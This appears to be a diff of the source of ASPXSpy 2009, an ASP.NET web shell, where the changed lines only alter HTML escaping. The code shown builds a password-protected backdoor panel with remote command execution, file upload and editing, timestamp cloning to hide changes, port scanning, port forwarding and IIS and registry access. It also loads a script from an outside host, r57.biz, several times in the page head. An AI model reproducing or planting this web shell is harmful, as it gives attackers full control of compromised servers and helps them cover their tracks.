-irTU.InnerHtml="&lt;p&gt;&lt;font color=red&gt;MSSQL Version&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+jHlh+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;font color=red&gt;SrvRoleMember&lt;/font&gt; : &lt;i&gt;&lt;b&gt;"+dbo+"&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;";
+irTU.InnerHtml=&quot;<span class="ni">&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>font color=red<span class="ni">&amp;gt;</span>MSSQL Version<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span> : <span class="ni">&amp;lt;</span>i<span class="ni">&amp;gt;&amp;lt;</span>b<span class="ni">&amp;gt;</span>&quot;+jHlh+&quot;<span class="ni">&amp;lt;</span>/b<span class="ni">&amp;gt;&amp;lt;</span>/i<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;&amp;lt;</span>p<span class="ni">&amp;gt;&amp;lt;</span>font color=red<span class="ni">&amp;gt;</span>SrvRoleMember<span class="ni">&amp;lt;</span>/font<span class="ni">&amp;gt;</span> : <span class="ni">&amp;lt;</span>i<span class="ni">&amp;gt;&amp;lt;</span>b<span class="ni">&amp;gt;</span>&quot;+dbo+&quot;<span class="ni">&amp;lt;</span>/b<span class="ni">&amp;gt;&amp;lt;</span>/i<span class="ni">&amp;gt;&amp;lt;</span>/p<span class="ni">&amp;gt;</span>&quot;;
 }
 else
 {
@@ -1762,7 +1761,7 @@ public void MHLv()
 {
 WICxe();
 hOWTm.Visible=true;
-Bin_H2_Title.InnerText="PortMap &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;PortMap <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 }
 public class PortForward
 {
@@ -1833,7 +1832,7 @@ try
 {
 session RKXy=(session)ar.AsyncState;
 int Ret=RKXy.rdel.EndReceive(ar);
-if (Ret&gt;0)
+if (Ret<span class="ni">&amp;gt;</span>0)
 ltcpClient.BeginSend(DPrPL,0,Ret,SocketFlags.None,new AsyncCallback(JTcp),RKXy);
 else lyTOK();
 }
@@ -1855,7 +1854,7 @@ try
 {
 session RKXy=(session)ar.AsyncState;
 int Ret=RKXy.ldel.EndReceive(ar);
-if (Ret&gt;0)
+if (Ret<span class="ni">&amp;gt;</span>0)
 RKXy.rdel.BeginSend(wvZv,0,Ret,SocketFlags.None,new AsyncCallback(IZU),RKXy);
 else lyTOK();
 }
@@ -1909,8 +1908,8 @@ return tmp;
 }
 public void VikG()
 {
-string[] OTV=lOmX.Text.ToString().Split(',');
-for(int i=0;i&lt;OTV.Length;i++)
+string[] OTV=lOmX.Text.ToString().Split(&#39;,&#39;);
+for(int i=0;i<span class="ni">&amp;lt;</span>OTV.Length;i++)
 {
 IVc.Add(new ScanPort(mRDl(MdR.Text.ToString()),Int32.Parse(OTV[i])));
 }
@@ -1918,12 +1917,12 @@ try
 {
 Thread[] kbXY=new Thread[IVc.Count];
 int sdO=0;
-for(sdO=0;sdO&lt;IVc.Count;sdO++)
+for(sdO=0;sdO<span class="ni">&amp;lt;</span>IVc.Count;sdO++)
 {
 kbXY[sdO]=new Thread(new ThreadStart(((ScanPort)IVc[sdO]).Scan));
 kbXY[sdO].Start();
 }
-for(sdO=0;sdO&lt;kbXY.Length;sdO++)
+for(sdO=0;sdO<span class="ni">&amp;lt;</span>kbXY.Length;sdO++)
 kbXY[sdO].Join();
 }
 catch
@@ -1932,10 +1931,10 @@ catch
 }
 public class ScanPort
 {
-private string _ip="";
+private string _ip=&quot;&quot;;
 private int jTdO=0;
 private TimeSpan _timeSpent;
-private string QGcH="Not scanned";
+private string QGcH=&quot;Not scanned&quot;;
 public string ip
 {
 get { return _ip;}
@@ -1965,35 +1964,35 @@ try
 {
 iYap.Connect(_ip,jTdO);
 iYap.Close();
-QGcH="&lt;font color=green&gt;&lt;b&gt;Open&lt;/b&gt;&lt;/font&gt;";
+QGcH=&quot;<span class="ni">&amp;lt;</span>font color=green<span class="ni">&amp;gt;&amp;lt;</span>b<span class="ni">&amp;gt;</span>Open<span class="ni">&amp;lt;</span>/b<span class="ni">&amp;gt;&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 catch
 {
-QGcH="&lt;font color=red&gt;&lt;b&gt;Close&lt;/b&gt;&lt;/font&gt;";
+QGcH=&quot;<span class="ni">&amp;lt;</span>font color=red<span class="ni">&amp;gt;&amp;lt;</span>b<span class="ni">&amp;gt;</span>Close<span class="ni">&amp;lt;</span>/b<span class="ni">&amp;gt;&amp;lt;</span>/font<span class="ni">&amp;gt;</span>&quot;;
 }
 _timeSpent=DateTime.Now.Subtract(qYZT);
 }
 }
 public static void YFcNP(System.Web.UI.Page page)
 {
-page.RegisterHiddenField("__EVENTTARGET","");
-page.RegisterHiddenField("__FILE","");
-string s=@"&lt;script language=Javascript&gt;";
-s+=@"function Bin_PostBack(eventTarget,eventArgument)";
-s+=@"{";
-s+=@"var theform=document.forms[0];";
-s+=@"theform.__EVENTTARGET.value=eventTarget;";
-s+=@"theform.__FILE.value=eventArgument;";
-s+=@"theform.submit();";
-s+=@"} ";
-s+=@"&lt;/scr"+"ipt&gt;";
-page.RegisterStartupScript("",s);
+page.RegisterHiddenField(&quot;__EVENTTARGET&quot;,&quot;&quot;);
+page.RegisterHiddenField(&quot;__FILE&quot;,&quot;&quot;);
+string s=@&quot;<span class="ni">&amp;lt;</span>script language=Javascript<span class="ni">&amp;gt;</span>&quot;;
+s+=@&quot;function Bin_PostBack(eventTarget,eventArgument)&quot;;
+s+=@&quot;{&quot;;
+s+=@&quot;var theform=document.forms[0];&quot;;
+s+=@&quot;theform.__EVENTTARGET.value=eventTarget;&quot;;
+s+=@&quot;theform.__FILE.value=eventArgument;&quot;;
+s+=@&quot;theform.submit();&quot;;
+s+=@&quot;} &quot;;
+s+=@&quot;<span class="ni">&amp;lt;</span>/scr&quot;+&quot;ipt<span class="ni">&amp;gt;</span>&quot;;
+page.RegisterStartupScript(&quot;&quot;,s);
 }
 protected void PPtK(object sender,EventArgs e)
 {
 WICxe();
 yhv.Visible=true;
-Bin_H2_Title.InnerText="File Search &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;File Search <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 NaLJ.Value=Request.PhysicalApplicationPath;
 oJiym.Visible=false;
 }
@@ -2002,11 +2001,11 @@ protected void NBy(object sender,EventArgs e)
 DirectoryInfo GQMM=new DirectoryInfo(NaLJ.Value);
 if(!GQMM.Exists)
 {
-xseuB("Path invalid ! ");
+xseuB(&quot;Path invalid ! &quot;);
 return;
 }
 oog(GQMM);
-xseuB("Search completed ! ");
+xseuB(&quot;Search completed ! &quot;);
 }
 public void oog(DirectoryInfo dir)
 {
@@ -2021,11 +2020,11 @@ if(Bin_Files.FullName==Request.PhysicalPath)
 {
 continue;
 }
-if(!Regex.IsMatch(Bin_Files.Extension.Replace(".",""),"^("+UDLvA.Value+")$",RegexOptions.IgnoreCase))
+if(!Regex.IsMatch(Bin_Files.Extension.Replace(&quot;.&quot;,&quot;&quot;),&quot;^(&quot;+UDLvA.Value+&quot;)$&quot;,RegexOptions.IgnoreCase))
 {
 continue;
 }
-if(Ven.SelectedItem.Value=="name")
+if(Ven.SelectedItem.Value==&quot;name&quot;)
 {
 if(rAQ.Checked)
 {
@@ -2099,10 +2098,10 @@ public void FJvQ(FileInfo objfile)
 TableRow tr=new TableRow();
 TableCell tc=new TableCell();
 string bg=OKM();
-tr.Attributes["onmouseover"]="this.className='focus';";
+tr.Attributes[&quot;onmouseover&quot;]=&quot;this.className=&#39;focus&#39;;&quot;;
 tr.CssClass=bg;
-tr.Attributes["onmouseout"]="this.className='"+bg+"';";
-tc.Text="&lt;a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\"&gt;"+objfile.FullName+"&lt;/a&gt;";
+tr.Attributes[&quot;onmouseout&quot;]=&quot;this.className=&#39;&quot;+bg+&quot;&#39;;&quot;;
+tc.Text=&quot;<span class="ni">&amp;lt;</span>a href=\&quot;javascript:Bin_PostBack(&#39;Bin_Listdir&#39;,&#39;&quot;+MVVJ(objfile.DirectoryName)+&quot;&#39;)\&quot;<span class="ni">&amp;gt;</span>&quot;+objfile.FullName+&quot;<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>&quot;;
 tr.Cells.Add(tc);
 tc=new TableCell();
 tc.Text=objfile.LastWriteTime.ToString();
@@ -2119,7 +2118,7 @@ jDKt.InnerText=instr;
 }
 protected void xVm(object sender,EventArgs e)
 {
-string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,"MD5").ToLower();
+string Jfm=FormsAuthentication.HashPasswordForStoringInConfigFile(HRJ.Text,&quot;MD5&quot;).ToLower();
 if(Jfm==Password)
 {
 Response.Cookies.Add(new HttpCookie(vbhLn,Password));
@@ -2133,11 +2132,11 @@ tZSx();
 }
 protected void Ybg(object sender,EventArgs e)
 {
-krIR(Server.MapPath("."));
+krIR(Server.MapPath(&quot;.&quot;));
 }
 protected void KjPi(object sender,EventArgs e)
 {
-Bin_H2_Title.InnerText="IIS Spy &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;IIS Spy <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 WICxe();
 VNR.Visible=true;
 AdCx();
@@ -2147,7 +2146,7 @@ protected void DGCoW(object sender,EventArgs e)
 try
 {
 StreamWriter sw;
-if(NdCX.SelectedItem.Text=="UTF-8")
+if(NdCX.SelectedItem.Text==&quot;UTF-8&quot;)
 {
 sw=new StreamWriter(Sqon.Value,false,Encoding.UTF8);
 }
@@ -2157,7 +2156,7 @@ sw=new StreamWriter(Sqon.Value,false,Encoding.Default);
 }
 sw.Write(Xgvv.InnerText);
 sw.Close();
-xseuB("Save file success !");
+xseuB(&quot;Save file success !&quot;);
 }
 catch(Exception error)
 {
@@ -2172,7 +2171,7 @@ FlwA=OElM(FlwA);
 try
 {
 Fhq.PostedFile.SaveAs(FlwA+Path.GetFileName(Fhq.Value));
-xseuB("File upload success!");
+xseuB(&quot;File upload success!&quot;);
 }
 catch(Exception error)
 {
@@ -2186,7 +2185,7 @@ krIR(AXSbb.Value);
 }
 protected void mcCY(object sender,EventArgs e)
 {
-krIR(Server.MapPath("."));
+krIR(Server.MapPath(&quot;.&quot;));
 }
 protected void iVk(object sender,CommandEventArgs e)
 {
@@ -2199,7 +2198,7 @@ try
 File.SetCreationTimeUtc(QiFB.Value,File.GetCreationTimeUtc(lICp.Value));
 File.SetLastAccessTimeUtc(QiFB.Value,File.GetLastAccessTimeUtc(lICp.Value));
 File.SetLastWriteTimeUtc(QiFB.Value,File.GetLastWriteTimeUtc(lICp.Value));
-xseuB("File time clone success!");
+xseuB(&quot;File time clone success!&quot;);
 }
 catch(Exception error)
 {
@@ -2232,7 +2231,7 @@ File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);
 File.SetCreationTimeUtc(path,Convert.ToDateTime(yUqx.Value));
 File.SetLastAccessTimeUtc(path,Convert.ToDateTime(aLsn.Value));
 File.SetLastWriteTimeUtc(path,Convert.ToDateTime(uYjw.Value));
-xseuB("File attributes modify success!");
+xseuB(&quot;File attributes modify success!&quot;);
 }
 catch(Exception error)
 {
@@ -2244,7 +2243,7 @@ protected void VOxn(object sender,EventArgs e)
 {
 WICxe();
 vIac.Visible=true;
-Bin_H2_Title.InnerText="Execute Command &gt;&gt;";
+Bin_H2_Title.InnerText=&quot;Execute Command <span class="ni">&amp;gt;&amp;gt;</span>&quot;;
 }
 protected void FbhN(object sender,EventArgs e)
 {
@@ -2259,11 +2258,11 @@ ahAE.StartInfo.RedirectStandardOutput=true;
 ahAE.StartInfo.RedirectStandardError=true;
 ahAE.Start();
 string Uoc=ahAE.StandardOutput.ReadToEnd();
-Uoc=Uoc.Replace("&lt;","&lt;");
-Uoc=Uoc.Replace("&gt;","&gt;");
-Uoc=Uoc.Replace("\r\n","&lt;br&gt;");
+Uoc=Uoc.Replace(&quot;<span class="ni">&amp;lt;</span>&quot;,&quot;<span class="ni">&amp;lt;</span>&quot;);
+Uoc=Uoc.Replace(&quot;<span class="ni">&amp;gt;</span>&quot;,&quot;<span class="ni">&amp;gt;</span>&quot;);
+Uoc=Uoc.Replace(&quot;\r\n&quot;,&quot;<span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>&quot;);
 tnQRF.Visible=true;
-tnQRF.InnerHtml="&lt;hr width=\"100%\" noshade/&gt;&lt;pre&gt;"+Uoc+"&lt;/pre&gt;";
+tnQRF.InnerHtml=&quot;<span class="ni">&amp;lt;</span>hr width=\&quot;100%\&quot; noshade/<span class="ni">&amp;gt;&amp;lt;</span>pre<span class="ni">&amp;gt;</span>&quot;+Uoc+&quot;<span class="ni">&amp;lt;</span>/pre<span class="ni">&amp;gt;</span>&quot;;
 }
 catch(Exception error)
 {
@@ -2272,7 +2271,7 @@ xseuB(error.Message);
 }
 protected void RAFL(object sender,EventArgs e)
 {
-if(qPdI.Text.Length&gt;0)
+if(qPdI.Text.Length<span class="ni">&amp;gt;</span>0)
 {
 tpRQ(qPdI.Text);
 }
@@ -2315,20 +2314,20 @@ rAhe();
 }
 protected void zOVO(object sender,EventArgs e)
 {
-if(((DropDownList)sender).ID.ToString()=="WYmo")
+if(((DropDownList)sender).ID.ToString()==&quot;WYmo&quot;)
 {
 dQIIF.Visible=false;
 MasR.Text=WYmo.SelectedItem.Value.ToString();
 }
-if(((DropDownList)sender).ID.ToString()=="Pvf")
+if(((DropDownList)sender).ID.ToString()==&quot;Pvf&quot;)
 {
 xTZY();
 }
-if(((DropDownList)sender).ID.ToString()=="FGEy")
+if(((DropDownList)sender).ID.ToString()==&quot;FGEy&quot;)
 {
 jHIy.InnerText=FGEy.SelectedItem.Value.ToString();
 }
-if(((DropDownList)sender).ID.ToString()=="NdCX")
+if(((DropDownList)sender).ID.ToString()==&quot;NdCX&quot;)
 {
 gLKc(Sqon.Value);
 }
@@ -2352,13 +2351,13 @@ MHLv();
 protected void vJNsE(object sender,EventArgs e)
 {
 vuou();
-xseuB("Clear All Thread ......");
+xseuB(&quot;Clear All Thread ......&quot;);
 }
 protected void wDZ(object sender,EventArgs e)
 {
-if(iXdh.Value=="" || eEpm.Value.Length&lt;7 || ZHS.Value=="")return;
+if(iXdh.Value==&quot;&quot; || eEpm.Value.Length<span class="ni">&amp;lt;</span>7 || ZHS.Value==&quot;&quot;)return;
 ruQO();
-xseuB("All Thread Start ......");
+xseuB(&quot;All Thread Start ......&quot;);
 }
 protected void tYoZ(object sender,EventArgs e)
 {
@@ -2370,7 +2369,7 @@ GBYT.Visible=true;
 string res=string.Empty;
 foreach(ScanPort th in IVc)
 {
-res+=th.ip+" : "+th.port+" ................................. "+th.status+"&lt;br&gt;";
+res+=th.ip+&quot; : &quot;+th.port+&quot; ................................. &quot;+th.status+&quot;<span class="ni">&amp;lt;</span>br<span class="ni">&amp;gt;</span>&quot;;
 }
 GBYT.InnerHtml=res;
 }
@@ -2391,20 +2390,20 @@ hOWTm.Visible=false;
 vrFA.Visible=false;
 yhv.Visible=false;
 }
-&lt;/script&gt;
-&lt;html xmlns="http://www.w3.org/1999/xhtml" &gt;
-&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
-&lt;head id="Head1" runat="server"&gt;
-&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
-&lt;meta http-equiv="Content-Type" content="text/html;charset=utf-8"/&gt;
-&lt;title&gt;ASPXspy&lt;/title&gt;
-&lt;SCRIPT SRC=http://r57.biz/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
-&lt;style type="text/css"&gt;
+<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>SCRIPT SRC=http://r57.biz/yazciz/ciz.js<span class="ni">&amp;gt;&amp;lt;</span>/SCRIPT<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>head id=&quot;Head1&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>SCRIPT SRC=http://r57.biz/yazciz/ciz.js<span class="ni">&amp;gt;&amp;lt;</span>/SCRIPT<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>title<span class="ni">&amp;gt;</span>ASPXspy<span class="ni">&amp;lt;</span>/title<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>SCRIPT SRC=http://r57.biz/yazciz/ciz.js<span class="ni">&amp;gt;&amp;lt;</span>/SCRIPT<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>style type=&quot;text/css&quot;<span class="ni">&amp;gt;</span>
 .Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
 .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:16px;}
 .list{font:12px Arial,Tahoma;height:23px;}
-.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
+.area{font:12px &#39;Courier New&#39;,Monospace;background:#fff;border: 1px solid #666;padding:2px;}
 .bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
 a {color: #00f;text-decoration:underline;}
 a:hover{color: #f00;text-decoration:none;}
@@ -2419,258 +2418,257 @@ ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
 u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
 .u1{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
 .u2{text-decoration: none;color:#777;float:left;display:block;width:350px;margin-right:10px;}
-&lt;/style&gt;
-&lt;script type="text/javascript"&gt;
+<span class="ni">&amp;lt;</span>/style<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="ni">&amp;gt;</span>
 function CheckAll(form){
-for(var i=0;i&lt;form.elements.length;i++){
+for(var i=0;i<span class="ni">&amp;lt;</span>form.elements.length;i++){
 var e=form.elements[i];
-if(e.name!='chkall')
+if(e.name!=&#39;chkall&#39;)
 e.checked=form.chkall.checked;
 }
 }
-&lt;/script&gt;
-&lt;/head&gt;
-&lt;body style="margin:0;table-layout:fixed;"&gt;
-&lt;form id="ASPXSpy" runat="server"&gt;
-&lt;div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" &gt;
-&lt;span style="font:11px Verdana;"&gt;Password:&lt;/span&gt;
-&lt;asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" &gt;&lt;/asp:TextBox&gt;
-&lt;asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/&gt;&lt;p/&gt;
-Copyright &copy; 2009 Bin -- &lt;a href="http://www.rootkit.net.cn" target="_blank"&gt;www.rootkit.net.cn&lt;/a&gt;
-&lt;/div&gt;
-&lt;div id="ZVS" runat="server"&gt;
-&lt;div id="Zzj" runat="server"&gt;
-&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
-&lt;tr class="head"&gt;
-&lt;td &gt;&lt;span style="float:right;"&gt;&lt;a href="http://www.rootkit.net.cn" target="_blank"&gt;ASPXSpy Ver: 2009&lt;/a&gt;&lt;/span&gt;&lt;span id="Bin_Span_Sname" runat="server" enableviewstate="true"&gt;&lt;/span&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr class="alt1"&gt;
-&lt;td&gt;&lt;span style="float:right;" id="Bin_Span_FrameVersion" runat="server"&gt;&lt;/span&gt;
-&lt;asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="Logout" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="RsqhW" runat="server" Text="File Manager" OnClick="Ybg"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="xxzE" runat="server" Text="CmdShell" OnClick="VOxn"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="nuc" runat="server" Text="IIS Spy" OnClick="KjPi"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="OREpx" runat="server" Text="Process" OnClick="Grxk"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jHN" runat="server" Text="Services" OnClick="ilC"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PHq" runat="server" Text="UserInfo" OnClick="Olm"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="wmgnK" runat="server" Text="SysInfo" OnClick="HtB"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="FeV" runat="server" Text="FileSearch" OnClick="PPtK"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="PVQ" runat="server" Text="SU Exp" OnClick="jXhS"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="jNDb" runat="server" Text="RegShell" OnClick="xSy"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="HDQ" runat="server" Text="PortScan" OnClick="cptS" &gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="AoI" runat="server" Text="DataBase" OnClick="dMx"&gt;&lt;/asp:LinkButton&gt; | &lt;asp:LinkButton ID="KHbEd" runat="server" Text="PortMap" OnClick="fDO"&gt;&lt;/asp:LinkButton&gt;
-&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;table width="100%" border="0" cellpadding="15" cellspacing="0"&gt;&lt;tr&gt;&lt;td&gt;
-&lt;div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"&gt;&lt;/div&gt;
-&lt;h2 id="Bin_H2_Title" runat="server"&gt;&lt;/h2&gt;
-&lt;%--FileList--%&gt;
-&lt;div id="CzfO" runat="server"&gt;
-&lt;table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;"&gt;
- &lt;tr&gt;
-&lt;td style=" white-space:nowrap"&gt;Current Directory : &lt;/td&gt;
-&lt;td style=" width:100%"&gt;&lt;input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/&gt;
-&lt;/td&gt;
-&lt;td style="white-space:nowrap" &gt;&lt;asp:Button ID="xaGwl" runat="server" Text="Go" CssClass="bt" OnClick="EXV"/&gt;&lt;/td&gt;
- &lt;/tr&gt;
-&lt;/table&gt;
-&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;
-&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;"&gt;
-&lt;div style="float:right;"&gt;&lt;input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/&gt;
-&lt;asp:Button ID="RvPp" CssClass="bt" runat="server" Text="Upload" OnClick="lbjLD"/&gt;&lt;/div&gt;&lt;asp:LinkButton ID="OLJFp" runat="server" Text="WebRoot" OnClick="mcCY"&gt;&lt;/asp:LinkButton&gt; | &lt;a href="#" id="Bin_Button_CreateDir" runat="server"&gt;Create Directory&lt;/a&gt; | &lt;a href="#" id="Bin_Button_CreateFile" runat="server"&gt;Create File&lt;/a&gt;
- | &lt;span id="Bin_Span_Drv" runat="server"&gt;&lt;/span&gt;&lt;a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red"&gt;Kill Me&lt;/a&gt;
-&lt;/td&gt;&lt;/tr&gt;
-&lt;asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" &gt;
-&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell&gt;&nbsp;&lt;/asp:TableCell&gt;&lt;asp:TableCell&gt;Filename&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;Last modified&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="15%"&gt;Size&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="25%"&gt;Action&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
-&lt;/asp:Table&gt;
-&lt;/table&gt;
-&lt;/div&gt;
-&lt;%--FileEdit--%&gt;
-&lt;div id="vrFA" runat="server"&gt;
-&lt;p&gt;Current File(import new file name and new file)&lt;br/&gt;
-&lt;input class="input" id="Sqon" type="text" size="100" runat="server"/&gt; &lt;asp:DropDownList ID="NdCX" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="zOVO"&gt;&lt;asp:ListItem&gt;Default&lt;/asp:ListItem&gt;&lt;asp:ListItem&gt;UTF-8&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;
-&lt;/p&gt;
-&lt;p&gt;File Content&lt;br/&gt;
-&lt;textarea id="Xgvv" runat="server" class="area" cols="100" rows="25" enableviewstate="true" &gt;&lt;/textarea&gt;
-&lt;/p&gt;
-&lt;p&gt;&lt;asp:Button ID="JJjbW" runat="server" Text="Submit" CssClass="bt" OnClick="DGCoW"/&gt; &lt;asp:Button ID="iCNu" runat="server" Text="Back" CssClass="bt" OnClick="IkkO"/&gt;&lt;/p&gt;
-&lt;/div&gt;
-&lt;%--CloneTime--%&gt;
-&lt;div id="zRyG" runat="server" enableviewstate="false" visible="false"&gt;
-&lt;p&gt;Alter file&lt;br/&gt;&lt;input class="input" id="QiFB" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
-&lt;p&gt;Reference file(fullpath)&lt;br/&gt;&lt;input class="input" id="lICp" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;asp:Button ID="JEaxV" runat="server" Text="Submit" CssClass="bt" OnClick="XXrLw"/&gt;&lt;/p&gt;
-&lt;h2&gt;Set last modified &raquo;&lt;/h2&gt;
-&lt;p&gt;Current file(fullpath)&lt;br/&gt;&lt;input class="input" id="pWVL" type="text" size="120" runat="server"/&gt;&lt;/p&gt;
-&lt;p&gt;
-&lt;asp:CheckBox ID="ZhWSK" runat="server" Text="ReadOnly" EnableViewState="False"/&gt;
-&nbsp;
-&lt;asp:CheckBox ID="SsR" runat="server" Text="System" EnableViewState="False"/&gt;
-&nbsp;
-&lt;asp:CheckBox ID="ccB" runat="server" Text="Hidden" EnableViewState="False"/&gt;
-&nbsp;
-&lt;asp:CheckBox ID="fbyZ" runat="server" Text="Archive" EnableViewState="False"/&gt;
-&lt;/p&gt;
-&lt;p&gt;
+<span class="ni">&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/head<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>body style=&quot;margin:0;table-layout:fixed;&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>form id=&quot;ASPXSpy&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;ljtzC&quot; runat=&quot;server&quot; style=&quot; margin:15px&quot; enableviewstate=&quot;false&quot; visible=&quot;false&quot; <span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>span style=&quot;font:11px Verdana;&quot;<span class="ni">&amp;gt;</span>Password:<span class="ni">&amp;lt;</span>/span<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:TextBox ID=&quot;HRJ&quot; runat=&quot;server&quot; Columns=&quot;20&quot; CssClass=&quot;Bin_Style_Login&quot; <span class="ni">&amp;gt;&amp;lt;</span>/asp:TextBox<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>asp:Button ID=&quot;ZSnXu&quot; runat=&quot;server&quot; Text=&quot;Login&quot; CssClass=&quot;Bin_Style_Login&quot; OnClick=&quot;xVm&quot;/<span class="ni">&amp;gt;&amp;lt;</span>p/<span class="ni">&amp;gt;</span>
+Copyright <span class="ni">&amp;copy;</span> 2009 Bin -- <span class="ni">&amp;lt;</span>a href=&quot;http://www.rootkit.net.cn&quot; target=&quot;_blank&quot;<span class="ni">&amp;gt;</span>www.rootkit.net.cn<span class="ni">&amp;lt;</span>/a<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>/div<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;ZVS&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>div id=&quot;Zzj&quot; runat=&quot;server&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;<span class="ni">&amp;gt;</span>
+<span class="ni">&amp;lt;</span>tr class=&quot;head&quot;<span class="ni">&amp;gt;</span>
